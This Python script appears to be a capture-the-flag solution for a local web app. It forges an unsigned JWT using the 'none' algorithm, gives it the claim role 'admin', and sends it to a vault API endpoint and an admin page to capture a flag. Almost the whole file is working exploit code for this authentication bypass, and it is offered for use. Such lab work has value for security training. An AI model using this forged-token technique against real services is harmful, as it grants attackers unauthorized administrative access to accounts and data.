#!/usr/bin/env python3
"""Debug the exact auth flow with JWT"""

import json
import base64
import time
import urllib.request
import urllib.error

def b64url_encode(data):
    json_str = json.dumps(data)
    return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()

def forge_jwt(customer_id="BS100001"):
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    h = b64url_encode(header)
    p = b64url_encode(payload)
    token = f"{h}.{p}."
    
    # Decode payload to verify
    decoded = base64.urlsafe_b64decode(p + '==')
    print(f"[*] JWT Payload decoded: {decoded.decode()}")
    
    return token

def test_api_vault():
    """Test the /api/v1/auth/vault endpoint directly"""
    base_url = "http://localhost:9443"
    
    token = forge_jwt("BS100001")
    print(f"\n[*] Generated JWT: {token[:50]}...")
    
    # Test the API endpoint directly
    url = f"{base_url}/api/v1/auth/vault"
    print(f"\n[*] Testing API endpoint: {url}")
    
    try:
        req = urllib.request.Request(url)
        req.add_header('Authorization', f'Bearer {token}')
        req.add_header('Accept', 'application/json')
        
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode())
            print(f"\n[SUCCESS] API Response:")
            print(json.dumps(data, indent=2))
            
            if data.get('ok'):
                print(f"\n[FLAG] {data.get('flag')}")
            
    except urllib.error.HTTPError as e:
        print(f"\n[API ERROR] HTTP {e.code}")
        try:
            error_data = json.loads(e.read().decode())
            print(f"Response: {json.dumps(error_data, indent=2)}")
        except:
            print(f"Response: {e.read().decode()}")
    except Exception as e:
        print(f"\n[ERROR] {type(e).__name__}: {e}")

def test_admin_page():
    """Test accessing /admin directly"""
    base_url = "http://localhost:9443"
    token = forge_jwt("BS100001")
    
    url = f"{base_url}/admin"
    print(f"\n[*] Testing admin page: {url}")
    
    try:
        req = urllib.request.Request(url)
        req.add_header('Cookie', f'access_token={token}')
        
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
            
            # Check if we got the admin page or redirected
            if 'Admin Dashboard' in html:
                print("[SUCCESS] Admin page loaded!")
                if 'Admin' in html:
                    print("[SUCCESS] 'Admin' text found in page")
            else:
                print("[FAIL] Admin page NOT loaded (likely redirected)")
                if 'dashboard' in html.lower():
                    print("[INFO] Appears to have redirected to dashboard")
            
    except urllib.error.HTTPError as e:
        print(f"\n[HTTP ERROR] {e.code}: {e.reason}")
    except Exception as e:
        print(f"\n[ERROR] {type(e).__name__}: {e}")

if __name__ == "__main__":
    test_api_vault()
    test_admin_page()
